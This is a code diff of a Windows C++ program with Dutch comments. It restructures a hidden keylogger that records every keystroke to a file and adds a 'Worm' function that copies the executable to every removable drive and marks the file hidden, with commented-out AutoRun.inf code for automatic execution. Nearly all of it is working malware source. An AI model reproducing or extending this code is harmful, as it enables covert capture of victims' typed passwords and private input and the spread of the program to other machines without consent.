@@ -28,7 +28,6 @@ void LOG(string input) {
 
     string TestDirectory = strcat(saveLocation, "\\test");
 
-    //string Log = TestDirectory + "\\" + filename;
     fstream LogFile(TestDirectory + "\\" + filename, fstream::app);
     if (LogFile.is_open()) {
         LogFile << input;
@@ -89,6 +88,99 @@ bool KillSwitch() {
 
 int KeyLogger()
 {
+    // voor elke toets wordt er gekeken of hij is ingedrukt
+    for (int KEY = 1; KEY <= 255; KEY++) {
+        if (GetAsyncKeyState(KEY) == -32767) {
+            if (!SpecialKeys(KEY)) {
+                char logged_key = static_cast<char>(KEY);
+                // numpad toetsen worden omgezet naar normale toetsen
+                if (KEY >= VK_NUMPAD0 && KEY <= VK_NUMPAD9) {
+                    logged_key = '0' + (KEY - VK_NUMPAD0);
+                // kijken of de toets een hoofdletter of kleine letter is (shift en capslock)
+                } else if (isalpha(logged_key)) {
+                    logged_key = (GetKeyState(VK_SHIFT) < 0) ^ (GetKeyState(VK_CAPITAL) & 1) ? toupper(logged_key) : tolower(logged_key);
+                }
+                // logt de toets
+                LOG(string(1, logged_key));
+            }
+        }
+    }
+    
+    return 0;
+}
+
+const char *drive[]={ 
+    "a:", "b:", "c:", "d:", "e:", "f:", "g:", "h:", "i:", "j:", "k:", "l:",
+    "m:", "n:", "o:", "p:", "q:", "r:", "s:", "t:", "u:", "v:", "w:", "x:",
+    "y:", "z:", 0
+};
+
+const char payload[MAX_PATH]="\\test.exe";
+const char infector[MAX_PATH]="\\infector.exe";
+
+int FindDrv(const char *drive)
+{
+    char dirX[MAX_PATH];
+    char path[MAX_PATH];
+    //char autorun[MAX_PATH]="AutoRun.inf";
+    //std::ofstream CreAut;
+    
+    //gets path of the current files
+    HMODULE GetQ; 
+    GetQ=GetModuleHandle(NULL);
+    GetModuleFileName(GetQ,path,sizeof(path));
+
+    std::string tempString = path;
+    std::string buff = tempString.substr(0, tempString.find_last_of("\\"));
+    strcpy(path, buff.c_str());
+    strcat(path, payload);
+
+    //CreAut.open(dirX,std::ios_base::out);
+    //CreAut<<"[AutoRun]" << std::endl;
+    //CreAut<<"open=test.exe" << std::endl;
+    //CreAut<<"shellexecute=test.exe" << std::endl;
+    //CreAut<<"UseAutoPlay=1" << std::endl;
+    //CreAut<<"shell\\Auto\\command=test.exe" << std::endl;
+    //CreAut<<"shell=Auto" << std::endl;
+    //CreAut.close();
+    //SetFileAttributes(dirX,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
+
+    UINT type= GetDriveType(drive);
+    
+    if(type == DRIVE_REMOVABLE)
+    {
+        strcpy(dirX, drive);
+        strcat(dirX, "\\");
+        strcat(dirX, "test.exe");
+
+        std::cout << path << std::endl;
+        std::cout << dirX << std::endl;
+
+        CopyFile(path,dirX,TRUE); 
+        SetFileAttributes(path,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
+        //strcpy(dirX, drive);
+        //strcat(dirX, "\\" );
+        //strcat(dirX, autorun);
+        //std::cout << "dirX: " << dirX << std::endl << std::endl << std::endl;
+
+        return 0;
+    } else {
+        //std::cout << "Not detected removable" << std::endl;
+    }
+    return 0;
+ 
+}
+
+int Worm() {
+    for(int i=0;drive[i];i++)
+    {
+        FindDrv(drive[i]);
+    }
+    return 0;
+}
+
+int main()
+{   
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     // zolang de keylogger niet wordt gestopt blijft hij lopen
     while (true) {
@@ -98,30 +190,9 @@ int KeyLogger()
             LOG("##KILLED##");
             break;
         }
-        // voor elke toets wordt er gekeken of hij is ingedrukt
-        for (int KEY = 1; KEY <= 255; KEY++) {
-            if (GetAsyncKeyState(KEY) == -32767) {
-                if (!SpecialKeys(KEY)) {
-                    char logged_key = static_cast<char>(KEY);
-                    // numpad toetsen worden omgezet naar normale toetsen
-                    if (KEY >= VK_NUMPAD0 && KEY <= VK_NUMPAD9) {
-                        logged_key = '0' + (KEY - VK_NUMPAD0);
-                    // kijken of de toets een hoofdletter of kleine letter is (shift en capslock)
-                    } else if (isalpha(logged_key)) {
-                        logged_key = (GetKeyState(VK_SHIFT) < 0) ^ (GetKeyState(VK_CAPITAL) & 1) ? toupper(logged_key) : tolower(logged_key);
-                    }
-                    // logt de toets
-                    LOG(string(1, logged_key));
-                }
-            }
-        }
+        Worm(); // voert de worm uit 
+        KeyLogger();
     }
-
-    return 0;
-}
-
-int main()
-{    
-    KeyLogger();
+    
     return 0;
 }
